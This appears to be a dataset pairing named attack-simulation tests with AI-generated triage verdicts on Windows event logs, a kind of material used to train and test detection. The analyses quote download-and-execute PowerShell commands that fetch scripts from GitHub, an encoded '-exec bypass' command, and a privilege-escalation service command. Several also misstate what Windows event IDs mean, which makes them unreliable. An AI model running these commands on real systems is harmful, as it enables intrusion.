WMI Reconnaissance Processes,"After analyzing the provided Windows event logs, here is a detailed breakdown and assessment:

### Analysis:

1. **Process Creation Events:** 
    - **Sysmon EventID 1 and 5:** These logs show processes being created, specifically focusing on `hostname.exe`, `whoami.exe`, `cmd.exe`, `wevtutil.exe`, `WMIC.exe`, and processes related to Microsoft Edge Installer. 
    - Many instances of common Windows executable files (`whoami.exe`, `hostname.exe`, `cmd.exe`, `wevtutil.exe`, `WMIC.exe`) are executed by the user `SERVER002\admin_test`. 
    - The use of `wevtutil.exe` and `WMIC.exe`, while legitimate, can sometimes be leveraged for log clearing or executing system commands respectively, which warrants closer scrutiny if out of the ordinary.
    - The frequent execution of `conhost.exe` associated with these binaries corresponds to common activities of command-line executions.

2. **Microsoft Edge Updates:** 
    - There are numerous Sysmon events related to Microsoft Edge update activities. These involve the processes related to `setup.exe` from the Edge installation directory, executed by `NT AUTHORITY\SYSTEM`. 
    - These activities are consistent with a standard software update process for Microsoft Edge.

3. **Security Audit Logs:**
    - **Event ID 4799:** Indicates SID history manipulation or group membership changes. The specific log indicates a benign system task related to software installations, involving an Edge update setup activity logged under `C:\Program Files (x86)\Microsoft\EdgeUpdate`.

### Assessment:

- **Normal Windows Operations:**
  - The logs reveal regular system operations and scheduled software updates (Microsoft Edge), which are typical activities and consistent with legitimate use cases.
  - The execution of `whoami.exe`, `hostname.exe`, and `cmd.exe` by `SERVER002\admin_test` does not immediately raise concerns of malicious activity without evidence of further exploitative use or suspicious parameters.

- **Potential Concerns:**
  - While the usage of `wevtutil.exe` and `WMIC.exe` might be part of legitimate admin activities, if these actions are not expected for the `admin_test` user or observed within managed scripts, their use should be verified with system administrators to rule out potential misuse.
  - Reviewing the timing and frequency of these executions against known administrative tasks might be beneficial.

### Resolution:

Based upon the provided information and context, the logs primarily indicate **BENIGN** activity, consisting of expected system and software update tasks. However, to ensure complete security, confirming the scheduled nature or the necessity of utility usage by `admin_test` with system administrators might be advisable for thoroughness."
Writes text to a file and displays it,"Upon reviewing the provided logs, here are my findings:

### Sysmon Logs Analysis:
1. **wevtutil.exe Usage:**
   - Multiple instances of `C:\Windows\System32\wevtutil.exe` are executed by the user `SERVER002\admin_test`. `wevtutil.exe` is a legitimate Windows utility used to manage event logs. However, it can be suspicious if used by unauthorized personnel, as it can be leveraged to clear logs, potentially hiding malicious activity. The user executing it is named `admin_test`, which raises suspicion due to its non-descriptive nature, implying a potential test or default account could be used or misused.

2. **cmd.exe Execution:**
   - An instance of `cmd.exe` is seen with the command-line argument to write a string to a file in the `%TEMP%` directory. This behavior itself isn't inherently malicious, but the presence of multiple command-line executions may hint at scripting or automation, potentially done for malicious purposes.

3. **whoami.exe and hostname.exe:**
   - `C:\Windows\System32\whoami.exe` and `C:\Windows\System32\HOSTNAME.EXE` are executed. They are legitimate utilities used for querying information about the user and the machine, respectively. While not directly malicious, their use could be part of post-exploitation reconnaissance activity.

### Security Logs Analysis:
1. **Logon Events:**
   - A `4634` event indicates a logoff for the user `admin_test`.
   - A `4624` event indicates a successful logon for the user `admin_test` from a device named `DESKTOP-3HL5B2P` using NTLM authentication. The logon type is `3`, which corresponds to a network logon. This might imply remote access, possibly legitimate or potentially unauthorized.
   - A `4672` event records special privileges assigned to `admin_test`, suggesting the account has privileged access rights, which could be risky if this account is compromised or misused.

### Application Logs Analysis:
- The application log records a `Software Protection Platform Service` event, which seems routine and not inherently suspicious on its own.

### Assessment:
- **Benign vs. Malicious Indicators:**
  - The series of `wevtutil.exe`, `cmd.exe`, `hostname.exe`, and `whoami.exe` executions under user `admin_test` could suggest experimentation or scripting involving system utilities. While there are legitimate use cases, the circumstances might hint at potential misuse.
  - The use of `admin_test` account, especially given the NTLM logon and assigned privileges, demands further scrutiny to ensure it's not a backdoor account or inadequately secured.

### Resolution:
Based on the analysis of the patterns and the context of the events, my conclusion leans towards:

**SUSPICIOUS**

#### Recommendations:
1. **Account Audit:**
   - Conduct an audit of the `admin_test` account to confirm its legitimacy, intended use, and security posture.
2. **Log and Account Monitoring:**
   - Increase monitoring on this account and consider setting up alerts for anomalous activities such as unexpected logins or privilege escalations.
3. **Review Commands and Scripts:**
   - Investigate further the motives behind the `cmd.exe` usage and scripts possibly being executed, verifying if they align with legitimate administrative tasks.
4. **Harden Security:**
   - Ensure strict adherence to the principle of least privilege for accounts and work on enhancing authentication mechanisms to prevent unauthorized access."
LNK Payload Download,"### Detailed Analysis of the Provided Windows Event Logs

#### **System and Security Logs**

1. **Time Manipulation:**
   - Several logs, specifically the EventID 4616 from the Security log and EventID 1 from the Kernel-General within the System log, indicate changes to the system time.
   - The time was set back from ""2024-10-25 18:22:29.6737667"" to ""2024-10-25 18:22:25.4673705"". This discrepancy, managed by svchost.exe, could hint at an attempt to rebalance system time. Downgrading time can occasionally be a tactic associated with misdirection or bypassing certain security timestamps, but in many server setups, this could also be related to normal operations like time synchronization using an NTP server.

2. **Privilege Change:**
   - EventID 4672 from the Security log indicates special privileges assigned to SYSTEM (SeDebugPrivilege, SeAuditPrivilege, etc.). These are standard for the SYSTEM account and do not necessarily indicate wrongdoing unless combined with other anomalies.
  
3. **Authentication Events:**
   - EventID 4624 logs a successful logon for the SYSTEM account. This is common for routine server operations and does not inherently show suspicious behavior.

#### **Sysmon and Application Logs**

1. **Process Creations:**
   - System utility programs such as `whoami.exe`, `hostname.exe`, `taskkill.exe`, and regular processes like `MicrosoftEdgeUpdate.exe` appear. They are executed from standard locations and with usual command line arguments, suggesting legitimate execution.
   - `whoami.exe` and `hostname.exe` calls indicate user identity and machine identity checks, typical in auditing or script executions.

2. **Wevtutil.exe Usage:**
   - Several instances of `wevtutil.exe` are logged. While this tool is used to manage event logs, frequent or unusual invocations can sometimes be a red flag. However, without explicit command-line activity showing malicious usage, this remains innocuous.

#### **PowerShell Logs**

1. **PowerShell Script Execution:**
   - A PowerShell command was executed: `Invoke-WebRequest` was used to download a file from a GitHub link into the temp directory, followed by starting the process, sleeping, and a forceful kill on an application (`a.exe`).
   - The use of external scripts, especially from GitHub, in combination with execution commands like `Start-Process` and `taskkill`, raises a red flag, suggesting potential malicious behavior, potentially indicative of a script attempting lateral movement or further payload execution.

### Overall Assessment

Upon reviewing these logs, the primary area of concern is the PowerShell execution involving an Internet-hosted script being downloaded and executed. While system processes and time changes might appear innocuous on their own, the PowerShell behavior suggests either a penetration test or a real breach attempt aiming to run an unknown executable.

### Resolution: **SUSPICIOUS**

**Guidance on Next Steps:**

1. **Investigate the Origin and Purpose** of the PowerShell script:
   - Identify the user `ADMIN_TEST` involved in the PowerShell execution and ask if they initiated or authorized this activity.
   - Analyze the downloaded file `test10.lnk` for potential malware.
   - Determine the nature of `a.exe`, which is being forcefully terminated, to understand its role in this chain of actions.

2. **Review System Time Changes:**
   - Monitor the NTP service and synchronization logs to ensure time manipulations are standardized and align with corporate policies.

3. **Conduct Full System Scans:**
   - Use endpoint detection and response (EDR) tools to scan for any persistent threats left by the suspicious activity.

4. **Monitoring and Alerts:**
   - Increase monitoring on `Server002` for any further abnormal activities, particularly PowerShell and network connections, to the external sites.

Conclude with a focused investigation on these indicators to rule out or confirm this as a legitimate action carried by an administrator or a security compromise."
ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments,"## Detailed Analysis:

Upon reviewing the provided Windows event logs from the Sysmon, PowerShell, and other logs, we observe several sequences of activities on the ""Server002"" machine initiated by the user ""SERVER002\\admin_test"". Below are the key observations from each component:

### Sysmon Log Observations:
1. **PowerShell Execution**: There are several instances of `powershell.exe` being executed (Event IDs 18013 and 18043), indicating heavy PowerShell usage.
   - *Suspicious Command Line*: The command includes encoded components and uses non-standard flags, shown in Event ID 18043 as: `""powershell.exe"" & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute -ErrorAction Stop}`. This suggests obfuscated and potentially malicious behavior.
   
2. **Process Creation with `wevtutil.exe`**:
   - The tool `wevtutil.exe` is often involved during event logs dumping or clearing, indicative of evasive tactics. This was found in records 18017, 18021, 18025, 18029, and 18033. Frequent creation of this process is a potential indicator of a log manipulation attempt.

3. **Frequent Execution of `conhost.exe`**:
   - Multiple executions of `conhost.exe` alongside other processes (e.g., PowerShell, `wevtutil.exe`) could be benign, but given the context, it may also support obfuscated command execution pipelines.

4. **Non-standard Execution of System Utilities**:
   - `Whoami.exe` and `hostname.exe` seem to have been executed (Event IDs 18039, 18035). While benign on their own, within the greater context, it may hint at an attacker gaining system information post-compromise.

### PowerShell Log Observations:
- **Encoded Commands**: The PowerShell logs confirm encoded and potentially obfuscated PowerShell usage. Commands are being executed with encoded arguments, suggesting a concerted effort to hide the true nature of the scripts or operations being executed.

### Assessment:

- The combination of encoded PowerShell scripts, suspicious usage of `wevtutil.exe`, and obfuscated command-line flags are classic signs of potential compromise. Specifically, encoded commands and typical post-exploitation strategies like clearing or dumping event logs using `wevtutil.exe` suggest malicious intentions.

### Threats and Risks Identified:
- There is a potential risk of malicious scripts running with administrative privileges.
- There may be a compromise involving PowerShell abuse and possible covering of tracks through event log manipulation.

### Recommended Resolution: **MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Isolation**: Isolate the affected machine to prevent further compromise or lateral movement within the network.
2. **Full Forensic Investigation**: Conduct a comprehensive investigation to identify any further indicators of compromise. Retrieve full command logs and check for persistence mechanisms.
3. **Review Access Logs**: Review user logs and access times for any anomalous activities.
4. **Security Patches and Updates**: Ensure all software, especially PowerShell and the operating system, are updated with the latest security patches.
5. **User Education**: Educate users on recognizing suspicious activities and report them immediately.
6. **SIEM Rule Monitoring**: Strengthen monitoring rules around PowerShell and `wevtutil.exe` usage, particularly looking for encoded and non-standard command-line activities.
7. **Review Network Traffic**: Analyze network traffic for any anomalous data exfiltration attempts concurrent with the suspicious activity periods.

This analysis highlights worrisome indicators consistent with malicious activity, warranting serious attention and response."
BlackCat pre-encryption cmds with Lateral Movement,"### Detailed Analysis

**1. Anomalous Command-Line Arguments and PowerShell Script Execution:**

- The Sysmon logs show a series of PowerShell script executions with suspicious command line arguments, notably involving `wmic`, `fsutil`, `reg`, and `PsExec.exe`. 
- The command in question includes `reg add` for registry modifications, creating symbolic links using `fsutil`, copying `PsExec.exe`, and executing it to remotely run a command. These actions mirror common techniques employed in lateral movement and privilege escalation tactics.

**2. Suspicious Process Activity:**

- Several instances of `wevtutil.exe` and `conhost.exe` are noted. While these can be legitimate processes, they are frequently used to enumerate and delete logs on a system to cover tracks post-intrusion, especially given the frequency of their appearances shortly after the PowerShell activity.
- `MicrosoftEdgeUpdate.exe` appearing in unusual directories (specifically a temporary location: `C:\\Program Files (x86)\\Microsoft\\Temp\\EU72C5.tmp\\MicrosoftEdgeUpdate.exe`) suggests potential masquerading tactics. Legitimately, this process runs from a fixed location typically associated with Microsoft Edge updates.

**3. Elevated Privileges and Potential Credential Dumping Attempt:**

- The log entries in the Security logs demonstrate multiple instances of elevated privileges (e.g., `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`), well known for being leveraged by malware and attackers to perform actions restricted to administrators.
- The execution of credential-dumping related commands and tools indicates possible attempts to extract credentials, evidenced by event ID 5379 in the Security log, associated with failed attempts to access certain credentials.

**4. Noisy and Rapid Process Creation:**

- The rapid succession of process activity suggests potential automated scripts or malware operations. The activities seem coordinated, evident from the quick transition between different commands and utilities.

### Assessment

**Based on the analysis of provided logs:**

- The combination of unauthorized PowerShell execution, registry and system changes, the use of PsExec, suspicious command execution, and noise in the process creation logs are strong indicators of malicious activity.
- Involvement of system tools to cover intrusions, attempts to escalate privileges, and potential lateral movement techniques being employed suggest a deliberate compromise attempt.

### Resolution

- **MALICIOUS** - The logs suggest a confirmed unauthorized and potentially harmful activity. 

### Recommended Actions

1. **Immediate Isolation**: The affected system (Server002) should be isolated to prevent further damage and lateral movement within the network.

2. **Deep Forensic Analysis**: Conduct a more thorough investigation to determine the extent of the compromise, including memory analysis and scanning for indicators of persistence.

3. **Credential Review**: Consider conducting a credential reset for user accounts that were potentially involved.

4. **Patch and Protect**: Ensure that the system is fully patched, particularly addressing any vulnerabilities that allow for misuse of PowerShell or remote execution tools like PsExec.

5. **Incident Response Plan**: Engage with the incident response team to confirm the breach scope, eliminate the threat, and implement long-term security improvements.

6. **Review Security Monitoring**: Enhance monitoring for similar activities in the future, focusing on PowerShell scripts and system modifications."
Cobalt Strike Lateral Movement (psexec_psh) pipe,"Upon reviewing the provided Windows event logs, we can identify and analyze the following notable activities:

1. **Use of Windows PowerShell**:
   - A process initiated with `powershell.exe` by the user `SERVER002\admin_test` is observed. Powershell is a legitimate system administration tool but is often exploited by attackers to execute scripts and commands. However, we don't have the command-line arguments to definitively classify this activity as malicious.

2. **Execution of Unexpected Processes**:
   - The logs record the execution of several command-line tools like `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`. These are legitimate Windows utilities:
     - `wevtutil.exe` is used for managing event logs.
     - `hostname.exe` and `whoami.exe` provide basic system information.
     - `cmd.exe` executing a command that involves a suspicious temp file: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\build\\namedpipes_executor.exe`.
   - The use of `cmd.exe` with paths and executables located in temporary directories (like `namedpipes_executor.exe`, `namedpipes_server.exe`, and `namedpipes_client.exe`) suggests potential unauthorized execution, and further investigation is warranted.

3. **Microsoft Edge Update Activity**:
   - Numerous logs indicate operations related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe` and related components). These are standard for maintaining browser versions up-to-date and do not appear malicious.

4. **Integrity Level and Permissions**:
   - Processes initiated by `SERVER002\admin_test` have a high integrity level, indicating they are capable of making significant system changes.

5. **Presence of Legitimate Scheduled Tasks**:
   - The execution of `taskhostw.exe` is linked to the management and hosting of Windows tasks. The presence is not inherently suspicious unless it relates to the execution of unexpected scripts or commands, which is not indicated by the logs.

### Assessment:
From this analysis, it stands out that the primary red flag involves the `cmd.exe` executing commands with executables in the temporary directory - particularly `namedpipes_executor.exe`, which is not a standard system application and may involve unauthorized software being executed. 

While there is standard legitimate software activity recorded, the combination of PowerShell usage, the execution of processes in unconventional directories, and scripts having high privileges warrants a more in-depth review.

### Resolution:
**SUSPICIOUS**: The logs contain activities that are abnormal and warrant further investigation. Specifically, actions involving PowerShell and unusual executables in temporary directories should be examined further to assess their purpose and legitimacy.

### Guidance:
1. **Further Investigation**: Conduct a deeper analysis of the command-line activities logged, especially those involving PowerShell and executables in temp directories.
2. **File Analysis**: Check the hash of `namedpipes_executor.exe` and related files against known threat databases. Perform static or dynamic analysis if hashes are unavailable.
3. **Review User Activity**: Evaluate logs for user `SERVER002\admin_test` to see the broader context of its actions, especially focusing on changes to system settings or files.
4. **Network Monitoring**: Monitor the network traffic to detect any outbound communications that may be related to unauthorized data exfiltration activities."
Office Generic Payload Download,"Upon analyzing the provided logs, several events stand out as potential indicators of malicious activity:

1. **PowerShell Execution with Malicious Script Invocation**:
   - There are multiple Sysmon and PowerShell log entries showing the execution of PowerShell with a suspicious command line. The command includes downloading and executing a script from a GitHub repository (`Invoke-MalDoc.ps1`). This indicates a potential download and execution of a malicious payload using PowerShell.
   - The specific command involved references a known technique for attacking Office applications like Word via macros: `Invoke-MalDoc -macroCode $macroCode -officeProduct ""Word""`. This is concerning and suggests attempts to exploit Office applications.

2. **Events Related to System Utilities (`HOSTNAME.EXE`, `whoami.exe`, `wevtutil.exe`)**:
   - Multiple executions have been recorded involving system utilities such as `wevtutil.exe`, `HOSTNAME.EXE`, and `whoami.exe` by the admin_test user. These tools can be used for reconnaissance and are often seen in conjunction with enumeration or privilege escalation attempts.
   - The frequent use of `wevtutil.exe` and `conhost.exe` in rapid succession may suggest manipulation or enumeration of event logs.

3. **Microsoft Edge Update Executions**:
   - There's a series of Microsoft Edge Update executions and service transitions in the logs. While these could be benign, they are executed multiple times with different command-line arguments. Normally, service updates happen periodically, but excessive or unusual executions could be monitored further to ensure no exploitation is occurring.

4. **Other System-Level Activity**:
   - Activities such as running Windows Defender updates (`MpCmdRun.exe`) and WMI operations (`WMIADAP.exe`) appear consistent with regular system maintenance but should be correlated with potential threats.

5. **Security Logs**:
   - The security log entry for a process invoked by `CompatTelRunner.exe` could be related to telemetry or compatibility updates but could also be suspicious if correlated with other malicious indicators.

Based on the above analysis:

- **Primary Concern**: The invocation of a PowerShell script that downloads potentially malicious content stands out as an actionable threat.
- **Secondary Concerns**: The frequent execution of system utilities and Edge update processes may be linked to the primary concern, indicating further investigation into user behavior and log correlation is warranted.

**Resolution: MALICIOUS**

### Guidance:
- **Immediate Action**: Isolate the affected system to prevent further potential compromise.
- **Further Investigation**: 
  - Conduct a deep dive into network connections to and from the host around the time these logs were generated to identify any potential data exfiltration or further malicious activities.
  - Review any related systems that could have been targeted using the PowerShell command or via Office macro exploits.
  - Utilize incident response protocols to assess the scope of any breach.
- **Prevention**: Ensure strong PowerShell logging is in place and review system configurations to prevent unauthorized script execution and social engineering attempts."
Create a Process using obfuscated Win32_Process,"Upon the detailed analysis of the provided Windows event logs, I have identified some key observations:

1. **PowerShell Activity:**
   - Multiple PowerShell log entries show command-line execution that involves using the `Invoke-WmiMethod` to create a process (`notepad.exe`) using a derived WMI class: `Win32_file`. This is particularly suspicious as it's not a typical or expected way to create processes and could indicate an attempt to bypass traditional security controls or logging mechanisms.
   - The use of PowerShell for such operations is often associated with malicious activity, especially as it attempts to execute binaries in an indirect manner.

2. **System Time Changes:**
   - There are several indications in the logs that the system time was changed, as evidenced by Windows Kernel-General and Security event logs (`EventID 4616`). 
   - Time manipulation might be indicative of attempts to evade time-based monitoring or logging, or to manipulate time-stamped security logs. The process responsible for these changes is `svchost.exe`, a legitimate system process often targeted or used by attackers.

3. **Sysmon Process Creation Events:**
   - Sysmon logs indicate legitimate processes (such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `powershell.exe`, and `notepad.exe`) were executed under the `SERVER002\admin_test` account. 
   - The PowerShell execution and subsequent process creations (`notepad.exe` launched by `PowerShell`) align with the suspicious activities observed in the PowerShell event logs.

4. **Overall Context:**
   - The presence of orchestration through WMI and PowerShell, combined with unexpected system time modifications, raises flags of potentially malicious activities. These patterns indicate a high likelihood of compromise focusing on evasion and stealth.

**Resolution: MALICIOUS**

Based on the analysis, the logs contain concrete indicators of potentially malicious activities. The creation of a process via PowerShell using WMI and the system time alterations are critical concerns:

**Guidance on Next Steps:**
- **Immediate Response:** Isolate the affected host (Server002) to prevent any potential lateral movement by the attacker.
- **Detailed Investigation:** Further investigate the origin and intent of the PowerShell script/activity and review WMI class modifications.
- **User Account Review:** Assess the account (`SERVER002\admin_test`) for misuse, and consider password changes or disabling if it seems suspect.
- **Log Review & Correlation:** Correlate these findings with any network logs or other security solutions deployed, like EDR (Endpoint Detection and Response), for additional context and tracing origin points or related activities.
- **Incident Reporting:** Report this incident to relevant internal teams and prepare for the potential need for forensic investigations.
- **Patching and Hardening:** Ensure all systems have the latest patches, especially focusing on any known vulnerabilities related to Windows Management Instrumentation and PowerShell."
Create a Process using WMI Query and an Encoded Command,"Upon reviewing the provided event logs, several observations can be made:

1. **Process Execution Analysis**:
   - **wevtutil.exe** and **conhost.exe**:
     - Both of these processes are used frequently, indicating potential enumeration or log manipulation.
     - They are executed under the user `SERVER002\admin_test` which suggests elevated privileges.
     - However, using `wevtutil.exe` to query event logs and `conhost.exe` as a console window host doesn't inherently indicate malicious activity, but repeated and rapid invocation is unusual and merits further examination.

2. **Suspicious Command Execution**:
   - **cmd.exe and PowerShell**:
     - The command-line argument for `cmd.exe` indicates a PowerShell command using a bypass execution policy and encoded command: `powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA`.
     - The encoded command is highly indicative of malicious activity as it uses obfuscation techniques to execute scripts without detection.
     - PowerShell logs confirm the use of an encoded command with a bypass execution policy, emphasizing a high likelihood of malicious behavior.

3. **Time Manipulation**:
   - The system logs reveal attempts to alter the system time, which is a known indicator of an attacker trying to manipulate timestamps to avoid detection or audit trails.

4. **User and Process Correlation**:
   - The prevalent user across logs is `SERVER002\admin_test`, which suggests that actions executed under this user need scrutiny.
   - Many suspicious activities are initiated by `wsmprovhost.exe`, which is typically benign, yet here, it is the common parent process for suspicious PowerShell activities.

5. **Indications of Lateral Movement**:
   - The use of administrative utilities and system files (such as `whoami.exe`, `svchost.exe`, `cmd.exe`, `PowerShell.exe`) suggests attempts at reconnaissance or privilege escalation, typical in lateral movement activities.

Based on my findings, the logs display indicators that suggest the potential execution of malicious activities, predominantly around the use of PowerShell with encoded commands and time-setting manipulations.

**Resolution**: **MALICIOUS**

### Guidance:
- Immediately investigate the context and source of initiated PowerShell commands.
- Assess the security and integrity of `SERVER002\admin_test` user credentials and activities.
- Conduct a thorough audit on logs from the affected system to identify further malicious activities or presence of threats.
- Implement additional PowerShell logging and security measures to prevent unauthorized or obfuscated script execution in the future.
- Check for unauthorized network access or unusual outbound connections related to the observed activities."
WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique,"Based on the analysis of the provided logs, here are my detailed findings:

### Security Log

1. **Event ID 4616**: Indicates time change events by `svchost.exe`. This could be legitimate but should be reviewed for unauthorized time changes. No direct indication of malicious behavior is noted here.

2. **Event ID 4624**: Successful logon by `SYSTEM` via `Advapi`, typically non-interactive, associated with service startups or scheduled tasks. Normal for operations on a Windows system.

3. **Event ID 4672**: Privilege being assigned to the `SYSTEM` account. The privileges include sensitive ones like `SeDebugPrivilege`. Usage of `SYSTEM` and these privileges is common for system operations but can be dangerous if leveraged maliciously.

### Application Log

1. **SecurityCenter Events**: Indicate Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`), suggesting no known threats were active at the log time.

2. **Software Protection Platform Event**: Normal activity showing rule engine activity, suggesting licensing service operations or checks.

### System Log

1. **Service Control Manager Event ID 7045**: Registration of `svcHighPriv` as a new service with command `cmd.exe /C echo Uuup! > \\.\pipe\HighPriv`. The command's intention here is unusual and indicates something other than normal service creation. Given this context, it might be part of an exploitation attempt or proof of concept attack, particularly with the `LocalSystem` account.

2. **Service Control Manager Event IDs 7009 and 7000**: Indicate failure to start `svcHighPriv`, which suggests an intentional quick operation or privilege escalation attempt that was later discarded.

### Windows PowerShell Log

Events show multiple PowerShell instances executing scripts from an external source (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1`). This script appears to be running a command involving named pipes and privilege escalation tactics. This activity is highly suspicious and indicative of potentially unauthorized or malicious actions.

### Sysmon Log

1. **Numerous `cmd.exe`, `PowerShell.exe`, and related Console Host (`conhost.exe`) Execution**:
   - Scripts like `NamedPipeSystem.ps1` executed from a web-based script host.
   - The creation and execution of services such as `svcHighPriv` sourced from questionable scripts.

2. **Multiple `wevtutil.exe` Executions**: `wevtutil.exe` can be benign but is commonly utilized in attacks for event log operations or clearing.

3. **Process Cross-Execution of Commands**: The observed behavior can resemble post-exploitation tactics often seen in penetration testing or real-world attacks where systems are accessed for privilege escalation, lateral movement, or command execution.

### Assessment

- **Suspicious Activity**: Creation and attempted execution of a new high-privilege service `svcHighPriv` with odd behavior.
- **PowerShell Activity**: Suspicious and potentially malicious, given execution of a downloaded script aimed at system level access and manipulation through named pipes.

### Conclusion

The entirety of events, especially with executing PowerShell scripts from external URLs that are known for security testing and exploitation methodologies, combined with service creation under suspicious contexts, suggests a high likelihood of malicious behavior.

---

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediately investigate the source and nature of the PowerShell scripts executed.
- Review and remove unauthorized or suspicious services.
- Conduct a deeper compromise assessment, potentially isolate `Server002`.
- Ensure up-to-date anti-malware and monitoring solutions are active across all systems."
WMI Reconnaissance Software,"Based on the analysis of the provided Windows event logs, several observations can be made regarding potential indicators of malicious activity:

1. **Time Modification Events**: 
   - The Security and System logs contain event entries with the Event ID 4616, which indicates a system time change. This was executed by the process `C:\\Windows\\System32\\svchost.exe` under the `LOCAL SERVICE` user. Additionally, Event ID 1 in the System log under Windows Kernel-General corroborates these changes where the `NewTime` is earlier than the `OldTime`.
   - Changing system time can be associated with attempts to evade detection or manipulate timestamps, but in controlled environments, this could also be due to legitimate synchronization activities.

2. **Frequent Execution of System Utilities**:
   - The Sysmon logs show repeated execution of common Windows utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` running `wmic`. These processes are executed by the user `SERVER002\\admin_test`.
   - While these tools are legitimate, they are often used by attackers for reconnaissance or manipulation tasks. The sequence and frequency of such executions could point towards scripted automation or batch execution that attempts to gather system information.
   - Notably, `cmd.exe` was used with the command `wmic qfe get description,installedOn /format:csv`, which could be an attempt to list installed patches, potentially for vulnerability assessment, yet the usage itself is common in administrative tasks.

3. **Execution Integrity and Context**:
   - All Sysmon entries indicate an Integrity Level of `High`, suggesting that all processes were executed with elevated privileges. This might be typical administrative behavior but could also facilitate compromises if obtained through privilege escalation.
   - The parent process for many utility executions is `C:\\Windows\\System32\\wsmprovhost.exe`, which can suggest remote management sessions, potentially through Windows Remote Management (WinRM).

Overall Assessment:
- **SUSPICIOUS**: The combination of frequent recon-style command executions, system time manipulations, and elevated privileges are indicative of potential reconnaissance or preparation steps indicative of malicious activity. While not irrefutable proof of compromise, this pattern warrants further scrutiny. Potential next steps could include checking for any unauthorized access, correlating user activities with intended business processes, and reviewing any corresponding network activity during the identified timeframe.

Resolution: **SUSPICIOUS** - The logs contain activities that warrant further investigation to determine if they are benign or form part of a malicious campaign."
ATHPowerShellCommandLineParameter -EncodedCommand parameter variations,"Upon reviewing the provided logs, here's a detailed analysis:

### Analysis

1. **Sysmon Logs**:
    - The logs show several instances of legitimate Windows processes such as `powershell.exe`, `wevtutil.exe`, `conhost.exe`, `wsmprovhost.exe`, `hostname.exe`, and `whoami.exe` being executed.
    - The usage of `powershell.exe` has command-line arguments that include an encoded command parameter and execution flags (`-EncodedCommandParamVariation E -Execute -ErrorAction Stop`). Encoded commands in PowerShell can be a sign of obfuscation, which may indicate suspicious behavior. However, the details of what is encoded are not visible in the logs.
    - The `wevtutil.exe` and `conhost.exe` processes are also repeatedly executed. These tools are often used legitimately for administrative tasks or log management but should be closely monitored when they appear in near-simultaneous executions as seen here.

2. **System Logs**:
    - Logs from the Windows Update Client show regular system updates occurring, which appear normal for this timeframe. There’s no indication of update failure or unexpected update activity.

3. **Windows PowerShell Logs**:
    - The PowerShell logs indicate the startup and configuration of several PowerShell providers and engines with references to the same encoded command as seen in the Sysmon logs.

4. **Application Logs**:
    - The Software Protection Platform Service logged a usual event related to rules processing, which doesn’t indicate any compromise.

### Assessment

- **Suspicious Activity**: The encoded command in PowerShell is of particular interest as it deviates from typical PowerShell behavior. Although PowerShell is used for legitimate automation and administrative tasks, the use of encoded commands might suggest the concealment of potentially malicious intent. 
- **Overall Observation**: While there’s valid usage of Windows processes, the specific use of PowerShell with encoded commands and the clustering of event executions in a short window may warrant further inspection.

### Recommendations

- **Further Investigation**: Examine the specific encoded PowerShell commands using appropriate decoding tools. This would reveal if the commands are executing malicious tasks or are part of a legitimate script.
- **Review Admin Activity**: Check the activity of the `SERVER002\admin_test` user account, as it appears prominently in logs, to ensure there’s no account misuse.
- **Enhance Monitoring**: Increase monitoring for anomalies in PowerShell use and reinforce detection rules for encoded or obfuscated scripts.

### Resolution

Based on the information provided, the logs are classified as **SUSPICIOUS**. This indicates activity that does not conform to expected behavior or configuration, thereby necessitating a deeper investigation to rule out any malicious undertakings. Further context regarding the encoded command in PowerShell should clarify the intent."
OSTap Style Macro Execution,"## Detailed Analysis

### Suspicious or Anomalous Behavior

Upon reviewing the logs, I have identified a few pieces of activity that stand out:

1. **PowerShell Execution**:
   - There are several Sysmon events indicating the execution of PowerShell on the host `Server002`. The specific command executed is highly suspicious, as it involves downloading a script from an internet location: `https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1`. This script is being executed using `Invoke-Expression` (`IEX`), which is often used in malicious activities to obfuscate actions or download and execute potentially dangerous scripts.

2. **Process Creation Events**:
   - There are multiple Sysmon Event ID 5 (Process Termination) logs for processes like `wevtutil.exe`, `conhost.exe`, and others, associated with the user `SERVER002\admin_test`. However, these by themselves aren't inherently suspicious as these processes are part of normal Windows operations.
   - The PowerShell command leads to suspicious activities, specifically the spawning of a script (`Invoke-MalDoc`) intended to automate tasks within Microsoft Word and other office products via macro code, evidenced by the command lines in the PowerShell logs.

3. **Security Events**:
   - The security log shows event IDs 4624 (Successful Logon) and 4672 (Special Privileges Assigned to New Logon). While these aren't inherently suspicious, logon events with elevated privileges can potentially be exploited if combined with other tactics, techniques, and procedures (TTPs).

### Malicious Indicators

- The use of `Invoke-MalDoc` script is a direct attempt to execute a potentially malicious payload hidden in a file on the system (`art.jse`). Such behavior is tied directly with typical malware attacks which include steps like this to execute malicious code.
- The downloading of scripts directly from the internet and utilizing methods (`IEX`, `& { }`) known for executing code can be defined as indicators of compromise.

### Assessment

Based on the analysis of the logs, the behavior exhibited, especially the execution of PowerShell commands to download and execute a script from a raw content URL (GitHub), indicates a high likelihood of malicious intent or compromise. The `Invoke-MalDoc` event itself is a significant red flag indicating attempts to execute or leverage malicious macros within office products.

### Resolution: MALICIOUS

**Threats/Risks Identified**:

- The PowerShell execution indicates active attempts to execute malicious scripts, which potentially compromise the host.
- The act of downloading and running a script from the internet without prior validation is a significant security risk.
  
